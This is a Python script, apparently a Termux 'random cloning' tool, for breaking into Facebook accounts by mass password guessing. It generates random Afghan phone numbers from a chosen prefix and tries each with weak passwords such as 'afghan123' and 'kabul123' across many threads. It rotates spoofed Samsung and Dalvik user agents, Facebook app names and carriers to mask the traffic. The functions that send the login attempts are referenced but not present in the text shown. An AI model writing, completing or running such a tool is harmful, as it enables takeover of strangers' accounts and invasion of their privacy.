
from os import path
import os,base64,zlib,pip,urllib
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
fbks=(f'com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
ugen=[]
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python AhMad Badakhshi.py')
print('\n\033[1;31m Cheking Server...');time.sleep(3)


print('\n\033[1;32m Please Follow Me');time.sleep(1)
#os.system('xdg-open  https://www.facebook.com/700004599/posts/pfbid0QDbBhAcQFtsWctsTkNSv5GdyVmTWe298sCwjQ5DomZnRgtyRyWC5NnAGerqpv5yul/?app=fbl')

logo = """



\▄▄     ▄▄        ▄▄▄  ▄▄▄                  ▄▄
             ████    ██        ███  ███                  ██
             ████    ██▄████▄  ████████   ▄█████▄   ▄███▄██
            ██  ██   ██▀   ██  ██ ██ ██   ▀ ▄▄▄██  ██▀  ▀██
            ██████   ██    ██  ██ ▀▀ ██  ▄██▀▀▀██  ██    ██
           ▄██  ██▄  ██    ██  ██    ██  ██▄▄▄███  ▀██▄▄███
           ▀▀    ▀▀  ▀▀    ▀▀  ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀ ▀▀

\033[1;32m     \033[1;36mCREATED BY\33[0;m   :  \033[1;34mAhMad\33[0;m\033[1;31m Cybery \033[1;30mTeam\33[0;m
\033[1;32m     \033[1;33mAUTHOR       :  \033[1;36mAhMad MasTan
\033[1;32m     \033[1;34mGITHUB       :  \033[1;33badakhshi21
\033[1;32m     \033[1;35mSTATUS       :  \033[1;32mFree
\033[1;32m     \033[1;31mVIRSION      :  \033[1;33m0.1
"""
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;37m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
def menu():
			clear()
			print('\033[1;33m------------------------------------------------')
			print('\033[1;96m[1] RANDOM CLONING V1\n\033[1;95m[2] RANDOM CLONING V2\n\033[1;93m[3] CONTACT BY M-R DANISHYAR \n\033[1;91m[E] EXIT')
			print('\033[1;33m------------------------------------------------')
			xd=input(' CHOOSE: ')
			#os.system('xdg-open   https://www.facebook.com/ProfessioOnalSkipper')
			if xd in ['1','01']:
				awmafghan()
			if xd in ['02','2']:
				awmafghan1()
			if xd in ['04','4']:
				#os.system('xdg-open  https://www.facebook.com/Sayednasratullahmosvi1')
				print('\033[1;37m')
				print('\033[1;33m------------------------------------------------')
				print(' The process has completed')
				print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
				print('\033[1;33m------------------------------------------------')
				input(' Press enter to back ')
				os.system('python AhMad Badakhshi.py')
				
				exit()
				menu()
			elif xd in ['0','00']:
				exit(' Thanks ')
			else:
				exit(' OPTION NOT FOUND ...')
def awmafghan():
		user=[]
		clear()
		print('\033[1;33m             079, 070, 074, 077, 078')
		
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;31mEXAMPLE: 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		#os.system('xdg-open https://facebook.com/groups/892925915357288/')
		print('\033[1;33m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mFallow my facebook accont')
		#os.system('xdg-open   https://www.facebook.com/jason.cresalia')
		print('\033[1;33m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=100) as AWM:	
			clear()
			tl = str(len(user))
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mON/OFF YOUR MOBILE DATA BEFORE USE')
			print('\033[1;33m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰']
				if mthd in ['1','01']:
					AWM.submit(rndm,ids,passlist)
		print('\033[1;37m')
		print('\033[1;33m------------------------------------------------')
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		print('\033[1;33m------------------------------------------------')
		input(' Press enter to back ')
		os.system('python AhMad.py')
def awmafghan1():
		user=[]
		clear()
		print('\033[1;33m             079, 070, 074, 077, 078')
		
		code = input('\033[1;35mPUT CODE: ')
		try:
			limit = int(input('\033[1;31mEXAMPLE: 2000, 3000, 5000, 10000\n\033[1;37mLIMIT: '))
		except ValueError:
			limit = 5000
		clear()
		print('\033[1;37m [1] \033[1;37mJOIN OUR GROUP')
		#os.system('xdg-open https://facebook.com/groups/termux.command.awm/')
		print('\033[1;36m------------------------------------------------')
		mthd = input(' CHOOSE: ')
		clear()
		print('\033[1;32m [1] \033[1;31mFallow my facebook accont')
		#os.system('xdg-open   https://www.facebook.com/jason.cresalia')
		print('\033[1;36m------------------------------------------------')
		pcs = input(' [?] SELECT: ')
		
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AWM:	
			clear()
			tl = str(len(user))
			print(' TOTAL IDS : \033[1;33m'+tl+f' ')
			print(f'\033[1;34m CHOICE CODE  :\033[1;32m '+code)
			print(' \033[1;35mON/OFF YOUR MOBILE DATA BEFORE USE')
			print('\033[1;36m------------------------------------------------')
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'afghan','afghan12345','afghan123','afghanistan','500500','100200','10002000','kabul123','Afghan123','Afghanistan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹', '۱۰۰۲۰۰','۵۰۰۵۰۰','۵۰۰۶۰۰','Afghan1234','kabul1234','Kabul123','Kabul1234']
				if mthd in ['1','01']:
					AWM.submit(rndm2,ids,passlist)
		print('\033[1;37m')
		print('\033[1;36m------------------------------------------------')
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		print('\033[1;36m------------------------------------------------')
		input(' Press enter to back ')
		os.system('python AhMad Badakhshi.py')
enawm1 = ['en_GB','en_US']
aqib_dalvik_ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 10; O2 TV Box Build/QTT2.200720.001)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision Build/PSA29.97-37)","Dalvik/2.1.0 (Linux; U; Android 9; AFTANNA0 Build/PMAIN1.2992N)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6P Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 13; V2127 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; 23021RAAEG Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-G950F Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 12; 100071485 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; SM-A505N Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 10.0; YT7260L Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Gtel X7plus Build/O11019)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; TPS550A Build/KTU84Q)","Dalvik/2.1.0 (Linux; U; Android 10; TC57 Build/10-16-10.00-QG-U133-STD-HEL-04)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2271 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; iris60c Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; GT-S7580 Build/LMY48Y)","Dalvik/2.1.0 (Linux; U; Android 7.0; SPYBOXSXMINI Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 11; K55g Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; V2065 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 11; E506 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; BNE-LX3 Build/HUAWEIBNE-LX3)","Dalvik/2.1.0 (Linux; U; Android 9; APEXA-A-1500 Build/PI)","Dalvik/2.1.0 (Linux; U; Android 9; DL3Plus Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 11; E7110 Build/4.501VZ.0568.a)","Dalvik/2.1.0 (Linux; U; Android 9; VISIO TV Build/PTO7.210711.001)","Dalvik/2.1.0 (Linux; U; Android 9.0; PHILCO_ATV11 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; Redmi Note 8 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX1 Build/HONORRBN-N31)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one action Build/QSB30.62-17-17)","Dalvik/2.1.0 (Linux; U; Android 5.1; YU 6000 Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; 23028RA60L Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 10; Note 7T Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36","Dalvik/2.1.0 (Linux; U; Android 13; SM-G9880 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; T10W2 Build/RP1A.201105.002)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; CORN X55 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; PO-10034 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; 2209116AG Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; DroidBox Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 9; moto e(6) plus Build/PTAS29.401-25-3)","Dalvik/2.1.0 (Linux; U; Android 11; Motorola Defy Build/RZD31.31)","Dalvik/2.1.0 (Linux; U; Android 10; HEYOU20 Build/QKQ1.191008.001)","Dalvik/2.1.0 (Linux; U; Android 11; U55 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; px30_evb Build/OPM8.190505.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-3-1)","Dalvik/2.1.0 (Linux; U; Android 12; moto g72 Build/S3SVS32.45-28-2-2)","Dalvik/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build/S3SGS32.39-60-1)","Dalvik/2.1.0 (Linux; U; Android 12; A003SH Build/S2010)","Dalvik/2.1.0 (Linux; U; Android 9; VOG-L04 Build/HUAWEIVOG-L04)","Dalvik/2.1.0 (Linux; U; Android 10; motorola one 5G ace Build/QZKS30.Q4-40-64-14)","Dalvik/2.1.0 (Linux; U; Android 11; JAD-LX9 Build/HUAWEIJAD-L09)","Dalvik/2.1.0 (Linux; U; Android 12; V2202 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 10.1; T99 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android UHD TV Build/RTM3.211215.227)","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 9 Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Black G Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 10; K6b Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 6.0; 4049G Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 7.1; GOLDTVPlus Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L33)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; G706 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 5.1; TIS001 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 11; C60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 10.0; B9212BF Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 6.0; W NEXT Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; Bmobile AX754 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; TIS_001 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; WS5SE Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; RKY-LX3 Build/HONORRKY-L03)","Dalvik/2.1.0 (Linux; U; Android 12; T776O Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; SGINO6 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; KB2007 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 11; ABR-LX9 Build/HUAWEIABR-L09)","Dalvik/2.1.0 (Linux; U; Android 11; NCO-LX3 Build/HUAWEINCO-LX3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYAS32.58-13-12-4)","Dalvik/2.1.0 (Linux; U; Android 13; SH-RM19s Build/S3067)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A047M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; Black_Z Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 22120RN86G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; S10 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; DS502 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2365 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A135N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; I2207 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.0; W55SE Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 11; K58 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-7)","Dalvik/1.6.0 (Linux; U; Android 4.4.2; GOA Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Platinum_B4P Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; VNE-LX3 Build/HONORVNE-L33CM)","Dalvik/2.1.0 (Linux; U; Android 11; G60 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(8) power lite Build/POD29.348-25)","Dalvik/2.1.0 (Linux; U; Android 6.0; T6001 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 9; SILVER_MAX Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 9; MBOX Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 7.0; BAC-L03 Build/HUAWEIBAC-L03)","Dalvik/2.1.0 (Linux; U; Android 9; S5-SH Build/S0006)","Dalvik/2.1.0 (Linux; U; Android 12; V2206 Build/SP1A.210812.003_SC)","Dalvik/2.1.0 (Linux; U; Android 13; V2110 Build/TP1A.220624.014_NONFC)",])
awmfban1 = [ 'MessengerLite', 'MobileAdsManagerAndroid', 'Orca-Android', 'FB4A', 'FB4A']
awmsim1 = [ 'MTN', 'AWCC', 'Roshan', 'Zong','Jazz','Etisalat']
modelxxx = ['X677','F98', 'NOTE 2 LTE', 'NOTE 2', 'Hot', 'Hot 1', 'Note 3', 'NOTE 3 PRO', 'Hot 10', 'Hot 10 Play', 'Note 4', 'Note 4 Pro', 'Hot 10s', 'Note 5', 'Note 10s NFC', 'Note 5 Stylus', 'Note 6', 'Note 7 LTE', 'Note 7', 'Note 7 Lite', 'Hot 10T', 'Hot 11', 'Hot 11s', 'Hot 12', 'Hot 12 Play', 'Hot 12 Play NFC', 'HOT','Note 12 Pro 5G', 'Hot 5', 'Hot 5 Pro', 'Hot 5 NFC', 'Hot 5 LTE', 'Hot 5 Lite', 'Hot 6', 'Hot 6 Pro', 'Hot 6 Lite', 'Hot 6 LTE', 'Hot 6 NFC', 'Hot 7', 'Hot 7 Lite', 'Hot 7 NFC', 'Hot 7 LTE', 'Hot 8', 'Hot 8 Pro', 'Hot 8 NFC', 'Hot 8 LTE', ' Hot 9', 'Hot 9 Pro', 'Hot 9 LTE', ' Hot 9 Lite', 'Hot 9 NFC']
awmSM=("SM-1015","SM-1020","SM-1030","SM-1035","SM-1040","SM-1045","SM-1050","SM-1240","SM-1440","SM-1450","SM-18190","SM-18262","SM-19060I","SM-19082","SM-19083","SM-19105","SM-19152","SM-19192","SM-19300","SM-19505","SM-2000","SM-20000","SM-200s","SM-3000","SM-414XOP","SM-6918","SM-7010","SM-7020","SM-7030","SM-7040","SM-7050","SM-7100","SM-7105","SM-7110","SM-7205","SM-7210","SM-7240R","SM-7245","SM-7303","SM-7310","SM-7320","SM-7325","SM-7326","SM-7340","SM-7405","SM-7550 5SM-8005","SM-8010","SM-81","SM-810","SM-8105","SM-8110","SM-8220S","SM-8410","SM-9300","SM-9320","SM-93G","SM-A7100","SM-A9500","SM-ANDROID","SM-B2710","SM-B5330","SM-B5330B","SM-B5330L","SM-B5330ZKAINU","SM-B5510","SM-B5512","SM-B5722","SM-B7510","SM-B7722","SM-B7810","SM-B9150","SM-B9388","SM-C3010","SM-C3262","SM-C3310R","SM-C3312","SM-C3312R","SM-C3313T","SM-C3322","SM-C3322i","SM-C3520","SM-C3520I","SM-C3592","SM-C3595","SM-C3782","SM-C6712","SM-E1282T","SM-E1500","SM-E2200","SM-E2202","SM-E2250","SM-E2252","SM-E2600","SM-E2652W","SM-E3210","SM-E3309","SM-E3309I","SM-E3309T","SM-G530H","SM-G930F","SM-H9500","SM-I5508","SM-I5801","SM-I6410","SM-I8150","SM-I8160OKLTPA","SM-I8160ZWLTTT","SM-I8258","SM-I8262D","SM-I8268""SM-I8505","SM-I8530BAABTU","SM-I8530BALCHO","SM-I8530BALTTT","SM-I8550E","SM-I8750","SM-I900","SM-I9008L","SM-I9080E","SM-I9082C","SM-I9082EWAINU","SM-I9082i","SM-I9100G","SM-I9100LKLCHT","SM-I9100M","SM-I9100P","SM-I9100T","SM-I9105UANDBT","SM-I9128E","SM-I9128I","SM-I9128V","SM-I9158P","SM-I9158V","SM-I9168I","SM-I9190","SM-I9192","SM-I9192I","SM-I9195H","SM-I9195L","SM-I9250","SM-I9300","SM-I9300I","SM-I9301I","SM-I9303I","SM-I9305N","SM-I9308I","SM-I9500","SM-I9505G","SM-I9505X","SM-I9507V","SM-I9600","SM-M5650","SM-N5000S","SM-N5100","SM-N5105","SM-N5110","SM-N5120","SM-N7000B","SM-N7005","SM-N7100","SM-N7100T","SM-N7102","SM-N7105","SM-N7105T","SM-N7108","SM-N7108D","SM-N8000","SM-N8005","SM-N8010","SM-N8020","SM-N9000","SM-N9505","SM-P1000CWAXSA","SM-P1000M","SM-P1000T","SM-P1010","SM-P3100B","SM-P3105","SM-P3108","SM-P3110","SM-P5100","SM-P5110","SM-P5200","SM-P5210","SM-P5210XD1","SM-P5220","SM-P6200","SM-P6200L","SM-P6201","SM-P6210","SM-P6211","SM-P6800","SM-P7100","SM-P7300","SM-P7300B","SM-P7310","SM-P7320","SM-P7500D","SM-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820",'SM-S908B','SM-G960U1','SC-04J','SC-51B','SM-S9080','SM-M536S','SM-G996W','SM-E426S','SM-G975F','SM-A207F','SM-A013G','SM-A145R','SM-S901B','SM-A145P','SM-N975F','SM-M136B','SM-A035M','SM-A135M','SM-A536B','SM-M115F','SM-M115F','SM-M115M','SM-M115M','SM-M107F','SM-M107G','SM-M107Y','SM-M107M','SM-M105F','SM-M105G','SM-M105Y','SM-M105M','SM-M127F','SM-M135F','SM-M135F','SM-M136B','SM-M136B','SM-M205F','SM-M205FN','SM-M205G','SM-M205M','SM-M205N','SM-N7000','SM-I9220','SHV-E160L','SHV-E160S','SM-J701F','SM-J701F','SM-J701M','SM-J701MT','SM-J710FN','SM-J710F','SM-J710H','SM-J710M','SM-J710GN','SM-J710MN','SM-J710K','SM-J7108','SM-J710FQ','SM-J737F','SM-J737V','SM-J737T','SM-J737A','SM-J737P','SM-J737T1','SM-J737U','SM-J737S','SM-J730F','SM-J730FM','SM-S727VL','SM-J730K','SM-N981B','SM-N981B','SM-N981U','SM-N981U1','SM-N981W','SM-N9810','SM-N981N','SM-J610F','SM-J610F','SM-J610G','SM-J610FN','SM-N980F','SM-N980F','SM-N770F','SM-N770F','SM-N770F','SM-N975F','SM-N975U','SM-N9750','SM-N975U1','SM-N975W','SM-N975N','SM-N975X','SCV45','SM-N971U','SM-N971N', "SM-A426B", "SM-A426B/DS", "SM-A4260", "SM-A426U", "SM-A426U1", "SM-A426N", "SM-A736B", "SM-A736B/DS", "SM-A336E", "SM-A336B", "SM-A336B/DS", "SM-A336B/DSN", "SM-A336E/DS", "SM-A336M", "SM-A326B", "SM-A326B/DS", "SM-A326BR/DS", "SM-A326BR", "SM-A326U", "SM-A326W", "SM-A326U1", "SM-A326K", "SCG08", "SM-S326DL", "SM-N9150", "SM-N915A", "SM-N915D", "SM-N915F", "SM-N915FY", "SM-N915G", "SM-N915K", "SM-N915L", "SM-N915P", "SM-N915R4", "SM-N915S", "SM-N915T", "SM-N915V", "SM-N915W8", "SM-N915X", "SC-01G")
